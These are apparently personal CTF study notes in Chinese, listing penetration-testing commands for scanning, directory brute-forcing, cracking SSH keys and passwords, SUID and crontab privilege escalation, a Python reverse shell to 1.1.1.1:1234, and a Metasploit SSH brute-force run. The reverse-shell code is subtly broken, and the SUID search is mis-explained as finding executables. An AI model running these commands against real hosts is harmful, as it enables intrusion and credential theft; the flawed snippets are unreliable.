# CTF 工具学习笔记

* nmap 探测工具

常用命令：

```bash
nmap -sV 192.168.6.0/24
```

表示扫描192.168.6.0.子网下所有机器的开放端口。

* dirb 查看站点隐藏文件

常用命令：

```bash
dirb http://192.168.7.6/
```

* ssh 远程连接

常用命令：

```bash
ssh -i id_rsa root@192.168.7.6
```

表示使用私钥文件id_rsa、用户名root登录远程主机192.168.7.6

其中 id_rsa 文件需要可读可写权限：

```bash
chmod 600 id_rsa
```

* ssh2john 转换ssh私钥为john可识别的信息。

常用命令：

```bash
ssh2john id_rsa > isacrack
```

* john 解密 isacrack 信息

john工具用于解密isacrack文件对应的信息。

命令：

```bash
zcat /usr/share/wordlists/rockyou.txt.gz | john --pipe --rules isacrack
```

* find 查看具有执行权限的文件

```bash
find / -perm -4000 2>/dev/null
```

从根目录查找具有可执行权限的文件，标准错误重定向到/dev/null

**要多注意 /root 目录下的文件。**

* 查看/etc/crontab，查找定时任务

查看其中不是root写权限的脚本或者指定的目录不存在，修改内容，执行

* 查看/etc/passwd，查看所有用户

* 查看 /etc/group，查看所有用户组

* 查看 /tmp 目录，没准有有用信息

* 反弹 shell
  在攻击机使用netcat开启一个tcp服务器，在靶机使用一个tcp socket连接上攻击机，然后将输入输出全都重定向到这个socket，然后启动一个shell子进程。

  代码大致如下：

```python
import os, subprocess, socket

s = socket.socket(socket.AF_INET, sock.SOCK_STREAM)
s.connect(("1.1.1.1", 1234))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p=subprocess(["/bin/sh", "-l"])
```

* netcat 本地监听

常用命令：

```bash
nc -lpv 1234
```

* netstat 查看端口占用

常用命令:

```bash
netstat -pantu
```

* whoami查看当前用户
* id 查看当前用户权限
* 使用cupp创建字典

```bash
git clone https://github.com/jeanphorn/common-password.git
cd common-password/
chmod +x cupp.py
./cupp.py -i
```

* 使用 metasploit 破解 ssh

在终端执行：
```bash
msfconsole
```

然后进入 msf 环境：

执行：

```bash
use auxiliary/scanner/ssh/ssh_login
set rhosts 192.168.1.137
set username skyfire
set pass_file dict.txt
run
```

就使用dict.txt中的密码破解远程ssh主机。

使用 `show options ` 可以查看参数

破解成功后，使用`session -i 1`可以打开终端，但是没有提示符。可以运行python脚进行优化显示：

```bash
python -c "import pty; pty.spawn('/bin/bash')"
```

* su 切换用户

常用命令：

```bash
su - root
```
